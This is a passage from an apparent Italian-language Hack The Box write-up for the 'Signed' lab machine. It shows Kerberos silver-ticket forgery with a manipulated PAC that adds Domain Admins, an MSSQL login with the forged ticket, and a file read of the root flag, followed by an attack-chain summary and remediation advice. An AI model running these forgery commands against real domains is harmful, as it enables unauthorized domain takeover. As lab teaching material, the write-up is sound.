+<span class="w">  </span>-domain-sid<span class="w"> </span>S-1-5-21-4088429403-1159899800-2753317549<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-domain<span class="w"> </span>signed.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-spn<span class="w"> </span>MSSQLSvc/DC01.signed.htb:1433<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-groups<span class="w"> </span><span class="m">512</span>,519,1105<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-user-id<span class="w"> </span><span class="m">1103</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>mssqlsvc
+</code></pre></div>
+<p>Parametri cambiano: <code>-groups</code> ora contiene RID di Domain Admins (512) e <code>-user-id</code> è 1103 (RID custom). Assegno il ticket:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>mssqlsvc_admin.ccache
+impacket-mssqlclient<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>dc01.signed.htb
+</code></pre></div>
+<p>Ora provo a leggere il root flag:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SQL</span><span class="w"> </span><span class="p">(</span><span class="n">SIGNED</span><span class="err">\</span><span class="n">mssqlsvc</span><span class="w">  </span><span class="n">dbo</span><span class="o">@</span><span class="n">master</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">OPENROWSET</span><span class="p">(</span><span class="n">BULK</span><span class="w"> </span><span class="s1">&#39;C:\Users\Administrator\Desktop\root.txt&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">SINGLE_CLOB</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">Contents</span><span class="p">;</span>
+</code></pre></div>
+<p>Success! Root flag ottenuto.</p>
+<p>Il motivo per cui funziona: <strong>il PAC forgiato dice al sistema che <code>mssqlsvc</code> è membro di Domain Admins. Il file system check vede il RID 512 nel token e concede accesso.</strong></p>
+<hr />
+<h2 id="8-why-this-works-technical-breakdown">8. Why This Works – Technical Breakdown<a class="headerlink" href="#8-why-this-works-technical-breakdown" title="Permanent link">&para;</a></h2>
+<p>Il Kerberos assume che i token firmati siano <strong>trustworthy</strong>. Quando abbiamo l'NT hash dell'account di servizio (<code>mssqlsvc</code>), possiamo <strong>forgiare il token completamente</strong>, includendo il PAC con RID arbitrari.</p>
+<p><strong>Differenze tra i due ticket:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Aspetto</th>
+<th>Primo Ticket</th>
+<th>Secondo Ticket</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Utente</strong></td>
+<td>Administrator (ID 500)</td>
+<td>mssqlsvc (ID 1103)</td>
+</tr>
+<tr>
+<td><strong>Gruppi</strong></td>
+<td>[1105] (User)</td>
+<td>[512, 519, 1105] (DA, EA, User)</td>
+</tr>
+<tr>
+<td><strong>Accessibilità DB</strong></td>
+<td>✓ <code>dbo</code> + <code>xp_cmdshell</code></td>
+<td>✓ <code>dbo</code> + <code>xp_cmdshell</code></td>
+</tr>
+<tr>
+<td><strong>Accessibilità File OS</strong></td>
+<td>✗ Processo non è DA</td>
+<td>✓ Processo eredita DA dal PAC</td>
+</tr>
+</tbody>
+</table>
+<p>Nel primo ticket, anche se <strong>il nome dice Administrator</strong>, il <strong>processo MS-SQL gira come <code>mssqlsvc</code></strong> che non è membro di DA.</p>
+<p>Nel secondo ticket, il PAC contiene il RID 512 (<strong>Domain Admins</strong>), quindi anche se il nome è <code>mssqlsvc</code>, il token ha i permessi necessari.</p>
+<hr />
+<h2 id="9-attack-chain-visualization">9. Attack Chain Visualization<a class="headerlink" href="#9-attack-chain-visualization" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>┌─ Initial Access: MS-SQL exposed (port 1433)
+├─ Stored Procedure Access: xp_dirtree → SMB auth coercion
+├─ NTLM Hash Capture: Responder intercept
+├─ Hash Cracking: Hashcat offline
+├─ Service Account Escalation: mssqlsvc DB access
+├─ SID Enumeration: Domain SID extraction
+├─ Silver Ticket (1): DB Admin → User Flag
+├─ PAC Manipulation: RID forging (Domain Admins membership)
+├─ Silver Ticket (2): OS-level DA → Root Flag
+└─ Domain Compromised
+</code></pre></div>
+<hr />
+<h2 id="10-remediation-prevention">10. Remediation &amp; Prevention<a class="headerlink" href="#10-remediation-prevention" title="Permanent link">&para;</a></h2>
+<p>Mitigare questo tipo di attacco richiede <strong>approccio multi-layer</strong>:</p>
+<p><strong>Immediate fixes:</strong>
+- Disabilitare <code>xp_dirtree</code> e <code>xp_cmdshell</code> sulle istanze MS-SQL che non li necessitano
+- Enforce strong/complex passwords su service accounts
+- Disabilitare LLMNR/NBT-NS via GPO (disarma Responder)</p>
+<p><strong>Medium-term:</strong>
+- Migrare service accounts verso <strong>Group Managed Service Accounts (gMSA)</strong> → password auto-rotated ogni 30 giorni (infeasible crackare nel tempo necessario)
+- Network segmentation: database VLAN isolata, solo app servers possono connettersi</p>
+<p><strong>Long-term:</strong>
+- Migrate to Kerberos-only (disable NTLM completamente)
+- Implement Zero-Trust model: conditional access basato su device posture
+- Deploy SIEM con detection su <code>xp_dirtree</code> execution e anomalie Kerberos</p>
+<hr />
+<h2 id="11-key-insights">11. Key Insights<a class="headerlink" href="#11-key-insights" title="Permanent link">&para;</a></h2>
+<p>Questo scenario dimostra il <strong>classic progression</strong>: una singola misconfiguration (DB esposto + xp_dirtree permessa) si propaga verso compromesso completo perché:</p>
+<ol>
+<li><strong>Service account bridging</strong> – Un account di servizio è il collegamento tra app layer e OS layer</li>
+<li><strong>Token trust model</strong> – Kerberos truста i token firmati senza revalidazione</li>
+<li><strong>PAC forgery</strong> – Se controlli l'account che firma i token, controlli i permessi</li>
+</ol>
+<p>Non è <strong>una</strong> vulnerabilità, ma una <strong>catena architetturale</strong> dove ogni layer assume che il precedente sia sicuro, ma non è così.</p>
+<hr />
+<p><strong>Assessment Completato: Ottobre 2025</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "toc.follow", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
